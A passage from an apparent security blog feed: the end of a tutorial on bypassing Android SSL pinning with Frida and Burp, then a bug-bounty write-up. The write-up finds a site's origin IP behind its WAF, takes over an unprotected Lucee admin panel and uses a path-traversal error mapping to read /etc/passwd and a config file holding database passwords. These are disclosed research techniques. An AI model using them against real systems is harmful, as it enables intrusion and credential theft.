&lt;/blockquote&gt;

&lt;p&gt;Now that we know it uses x86 arch, we can download the x86 server from &lt;a href=&quot;https://github.com/frida/frida/releases/download/12.7.20/frida-server-12.7.20-android-x86.xz&quot; style=&quot;color: red&quot;&gt;here&lt;/a&gt;
 &lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;wget&lt;/strong&gt; https://github.com/frida/frida/releases/download/12.7.20/frida-server-12.7.20-android-x86.xz&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;unxz&lt;/strong&gt; frida-server-12.7.20-android-x86.xz&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;mv&lt;/strong&gt; frida-server-12.7.20-android-x86 &lt;strong&gt;frida-server&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt; 
Lets push &lt;strong&gt;frida-server&lt;/strong&gt; and &lt;strong&gt;BurpSuite cert&lt;/strong&gt; to our device.
 &lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;/opt/genymotion/tools/adb &lt;strong&gt;push ~/Downloads/cacert.cer /data/local/tmp/cert-der.crt&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;/opt/genymotion/tools/adb &lt;strong&gt;push ~/Downloads/frida-server /data/local/tmp&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;/opt/genymotion/tools/adb &lt;strong&gt;shell chmod 777 /data/local/tmp/frida-server&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;/opt/genymotion/tools/adb &lt;strong&gt;shell /data/local/tmp/frida-server &amp;amp;&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;We have uploaded the files and we have started the server in background
 &lt;/p&gt;

&lt;p&gt;Before using the &lt;strong&gt;bypass-ssl-frida.js&lt;/strong&gt; script we should start the app that we want to intercept traffic then execute the command below to get its package name. For this writeup, I’m using Instacart just for demonstrating purposes.&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;$ frida-ps -U | grep instacart&lt;/strong&gt;&lt;/p&gt;
  &lt;blockquote&gt;
    &lt;p&gt;&lt;strong style=&quot;color: red&quot;&gt;com.instacart.client&lt;/strong&gt;
 &lt;/p&gt;
  &lt;/blockquote&gt;
&lt;/blockquote&gt;

&lt;p&gt;Lets check BurpSuite if it outputs any error for ssl.
 
&lt;img src=&quot;/assets/images/image16.png&quot; alt=&quot;image16&quot; class=&quot;images&quot; /&gt;
&lt;img src=&quot;/assets/images/image17.png&quot; alt=&quot;image17&quot; class=&quot;images&quot; /&gt;
 &lt;/p&gt;

&lt;p&gt;It seems that the application can’t connect to the internet due to ssl pinning, but if we execute the command below then it will bypass it.
 &lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;$ &lt;strong&gt;frida -U -f com.instacart.client -l ~/Downloads/bypass-ssl-frida.js –no-pause&lt;/strong&gt;
 &lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/image18.png&quot; alt=&quot;image18&quot; class=&quot;images&quot; /&gt;
 &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/image19.png&quot; alt=&quot;image19&quot; class=&quot;images&quot; /&gt;
 &lt;/p&gt;

&lt;p&gt;Now we can continue testing our prefered application with BurpSuite or your favourite web proxy.
 &lt;/p&gt;

&lt;p&gt;&lt;em&gt;Thank you for reading this and I hope that you’ll find it helpful&lt;/em&gt;
 &lt;/p&gt;</content><author><name></name></author><summary type="html">Configuring Frida with BurpSuite and Genymotion to bypass Android SSL Pinning</summary></entry><entry><title type="html">Bug Bounty - Information Disclosure through error message + WAF Bypass led to Local File Inclusion</title><link href="http://localhost:4000/bugbounty/Local-File-Inclusion/" rel="alternate" type="text/html" title="Bug Bounty - Information Disclosure through error message + WAF Bypass led to Local File Inclusion" /><published>2019-06-15T00:00:00-03:00</published><updated>2019-06-15T00:00:00-03:00</updated><id>http://localhost:4000/bugbounty/Local-File-Inclusion</id><content type="html" xml:base="http://localhost:4000/bugbounty/Local-File-Inclusion/">&lt;h2 id=&quot;bug-bounty---information-disclosure-through-error-message--waf-bypass-led-to-local-file-inclusion&quot;&gt;Bug Bounty - Information Disclosure through error message + WAF Bypass led to Local File Inclusion&lt;/h2&gt;

&lt;h1 id=&quot;summary&quot;&gt;Summary:&lt;/h1&gt;
&lt;p&gt;This is a writeup about a critical bug that me and &lt;a href=&quot;https://hackerone.com/cela&quot;&gt;0xcela&lt;/a&gt; found while poking around. This bug is undisclosed due to private program so I’m going to refer the company as &lt;strong&gt;redacted.com&lt;/strong&gt;
 &lt;/p&gt;

&lt;p&gt;A vulnerable directory was found which led to an information disclosure through error message. After trying different types of attacks we were blocked by Incapsula WAF, so we managed to find the origin ip to further continue our research where we found different endpoints which led to the same information disclosure through error message.&lt;/p&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;Exploitation:&lt;/h1&gt;
&lt;p&gt;While bruteforcing hidden directories and looking through waybackurls, we found a path &lt;strong&gt;/cfapps/&lt;/strong&gt; which output the error as shown in the picture below.
 
&lt;img src=&quot;/assets/images/image2.png&quot; alt=&quot;full path disclosure&quot; class=&quot;images&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;We also found some endpoints that accepted parameters but soon as we tried something suspicious we were blocked and we couldn’t access that site anymore. So we decided to look through censys.io search engine without any specific filter only “redacted.com” and we found the origin ip.&lt;/p&gt;

&lt;p&gt;To prove that we found the origin ip, we could compare the body and site headers.
 &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p80&lt;/span&gt;,443 redacted.com
80/tcp open http Incapsula CDN httpd
443/tcp open ssl/http Incapsula CDN http

&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p80&lt;/span&gt;,443 &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; IP
PORT STATE SERVICE VERSION
80/tcp open http Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
443/tcp open ssl/http Apache Tomcat/Coyote JSP engine 1.1

&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl https://IP/cfapps/ &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt;
&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;doctype html&amp;gt;
&amp;lt;title&amp;gt;External Apps&amp;lt;/title&amp;gt;
..[SNIP]..
&amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;center padding&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;ts &lt;span class=&quot;s1&quot;&gt;'2019-05-28 13:06:26'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&amp;lt;/div&amp;gt;
..[SNIP]..
&amp;lt;/html&amp;gt;

&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl https://redacted.com/cfapps/ &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt;
&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;doctype html&amp;gt;
&amp;lt;title&amp;gt;External Apps&amp;lt;/title&amp;gt;
..[SNIP]..
&amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;center padding&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;ts &lt;span class=&quot;s1&quot;&gt;'2019-05-28 13:07:53'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&amp;lt;/div&amp;gt;
..[SNIP]..
&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;We decided to report this because we thought that it would count as valid bug as it was exposing full paths but..
 
&lt;img src=&quot;/assets/images/image3.png&quot; alt=&quot;h1 reply&quot; class=&quot;images&quot; /&gt;
 
We continued our research to come up with an attack vector. We managed to log in into Lucee framework then abused Error Mapping function. What this function does is that when an error occurs, it redirects to a default error which is stored in a local file, in our case we could change it to read sensitive files.
 
After knowing that it uses Lucee framework, we browsed to https://IP/lucee/
 &lt;/p&gt;

&lt;p&gt;Lucee has a public admin interface by default which you can find the path on view-source of /lucee/ and is located on https://IP/lucee/lucee/admin/server.cfm
 &lt;/p&gt;

&lt;p&gt;This prompts for a new password, which we set to admin321. We could log out and log in again on &lt;strong&gt;https://IP/lucee/lucee/admin/web.cfm&lt;/strong&gt;. Even after we set a new password we could still change it by browsing to /server.cfm
 
Browsing to /lucee/lucee/admin/web.cfm?action=server.error we could change the function when the application receives an 404 or 500 error, we changed the 500 error from default value (/lucee/templates/error/error.cfm) to &lt;strong&gt;../../../../../../../../../../etc/passwd.&lt;/strong&gt;
 
&lt;img src=&quot;/assets/images/image4.png&quot; alt=&quot;Lucee Interface&quot; class=&quot;images&quot; /&gt;
 &lt;/p&gt;

&lt;p&gt;&lt;strong&gt;To execute the error.cfm, we made a request on a page that returned error 500&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; GET &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
https://IP/lucee/lucee/admin/web.cfm?action&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;debugging.logs&amp;amp;action2&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;detail&amp;amp;id&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;DCF806E56E1192D43C0A8B64EC573BC6
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt; 
&lt;strong&gt;Response&lt;/strong&gt;:
HTTP/1.1 500 Internal Server Error
Content-Type: text/html;charset=UTF-8&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p style=&quot;color: red&quot;&gt;root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:997:User for polkitd:/:/sbin/nologin
chrony:x:998:996::/var/lib/chrony:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
&lt;strong&gt;raladmin:x:1000:1000::/home/raladmin:/bin/bash&lt;/strong&gt;
sssd:x:997:994:User for sssd:/:/sbin/nologin
nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
setroubleshoot:x:996:992::/var/lib/setroubleshoot:/sbin/nologin
&lt;strong&gt;webuser:x:1001:1001:webuser:/home/webuser:/bin/bash&lt;/strong&gt;
postfix:x:89:89::/var/spool/postfix:/sbin/nologin&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt; 
&lt;img src=&quot;/assets/images/image5.png&quot; alt=&quot;passwd&quot; class=&quot;images&quot; /&gt;
 
We also managed to read ../../../../../../../../../../../../usr/share/tomcat/conf/server.xml
 
There was some sensitive info located in this file, including web-ldap and azure cloud postgresql passwords&lt;/p&gt;

&lt;h1 id=&quot;note&quot;&gt;Note:&lt;/h1&gt;
&lt;ul&gt;
  &lt;li&gt;Security Team decided to rate this bug as critical&lt;/li&gt;
  &lt;li&gt;Bounty awarded&lt;/li&gt;
  &lt;li&gt;Vulnerability fixed&lt;/li&gt;
&lt;/ul&gt;</content><author><name></name></author><summary type="html">Bug Bounty - Information Disclosure through error message + WAF Bypass led to Local File Inclusion</summary></entry></feed>